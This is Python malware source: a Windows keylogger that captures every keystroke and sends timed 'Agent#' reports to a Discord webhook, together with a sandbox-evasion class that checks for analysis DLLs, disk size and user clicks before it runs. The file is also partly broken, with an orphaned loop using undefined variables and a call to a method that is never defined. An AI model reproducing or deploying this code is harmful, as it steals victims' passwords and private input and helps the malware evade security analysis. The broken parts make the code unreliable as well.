import keyboard 
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed


class Keylogger:
    def __init__(self, interval, ID, webhook, report_method="webhook"):
        self.id = ID
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.webhook = webhook
        global STOP
        STOP = False

    def callback(self, event):
        global STOP
        if STOP:
            return
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_webhook(self):
        global STOP
        if STOP:
            return
        flag = False
        webhook = DiscordWebhook(url=self.webhook, username="Keylogger")
        if len(self.log) > 2000:
            flag = True
            path = os.environ["temp"] + "\\report.txt"
            with open(path, 'w+') as file:
                file.write(f"Keylogger Report | Agent#{self.id} | Time: {self.end_dt}\n\n")
                file.write(self.log)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='report.txt')
        else:
            embed = DiscordEmbed(title=f"Keylogger Report | Agent#{self.id} | Time: {self.end_dt}", description=self.log)
            webhook.add_embed(embed)    
        webhook.execute()
        if flag:
            os.remove(path)

    def report(self):
        global STOP
        if STOP:
            return
        if self.log:
            self.end_dt = datetime.now()
            if self.report_method == "webhook":
                self.report_to_webhook()    
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        global STOP
        STOP = False
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    def stop(self):
        global STOP
        STOP = True


from ctypes.wintypes import HKEY
import time
from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
import win32api
import win32process
import win32pdh
import sys
import os

from winreg import *
from datetime import datetime
from ctypes import *
import ctypes


class Evasion:
    def __init__(self):
        return None
        
    def check_all_DLL_names(self):
        SandboxEvidence = []
        sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
        allPids = win32process.EnumProcesses()
        for pid in allPids:
            try:
                hProcess = win32api.OpenProcess(0x0410, 0, pid)
                try:
                    curProcessDLLs = win32process.EnumProcessModules(hProcess)
                    for dll in curProcessDLLs:
                        dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
                        for sandboxDLL in sandboxDLLs:
                            if sandboxDLL in dllName:
                                if dllName not in SandboxEvidence:
                                    SandboxEvidence.append(dllName)
                finally:
                    win32api.CloseHandle(hProcess)
            except:
                pass

        if SandboxEvidence:
            return False
        else:
            return True
    


        
        for process in runningProcesses:
            for sandboxProcess in sandboxProcesses:
                if sandboxProcess in str(process):
                    if process not in EvidenceOfSandbox:
                        EvidenceOfSandbox.append(process)
                        break
        if not EvidenceOfSandbox:
            return True
        else:
            return False

    def disk_size(self):
        minDiskSizeGB = 50

        if len(sys.argv) > 1:
            minDiskSizeGB = float(sys.argv[1])

        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()

        diskSizeGB = diskSizeBytes/1073741824

        if diskSizeGB > minDiskSizeGB:
            return True
        else:
            return False

    def click_tracker(self):
        count = 0
        minClicks = 10

        if len(sys.argv) == 2:
            minClicks = int(sys.argv[1])
        while count < minClicks:
            new_state_left_click = win32api.GetAsyncKeyState(1)
            new_state_right_click = win32api.GetAsyncKeyState(2)

            if new_state_left_click % 2 == 1:
                count += 1
            if new_state_right_click % 2 == 1:
                count += 1

        return True
            
    def main(self):
        if self.disk_size() and self.click_tracker() and self.check_all_processes_names() and self.check_all_DLL_names():
            return True
        else:
            return False


def test():
    evasion = Evasion()
    if evasion.main() == True:
        return True
    else:
        return False